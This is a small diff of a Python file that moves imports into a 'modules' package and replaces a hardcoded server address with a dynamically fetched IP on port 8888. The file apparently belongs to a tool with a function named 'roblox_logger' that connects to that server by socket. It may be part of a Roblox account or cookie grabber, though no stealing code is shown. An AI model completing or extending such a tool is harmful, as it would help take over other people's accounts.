@@ -1,8 +1,9 @@
 import socket
-from loggers import *
-from ThreadWithReturnValue import *
+from modules.loggers import *
+from modules.ThreadWithReturnValue import *
+from modules.getServerIp import getServerip
 
-addr = ('192.168.75.43', 8888)
+addr = (getServerip(), 8888)
 
 
 def roblox_logger():
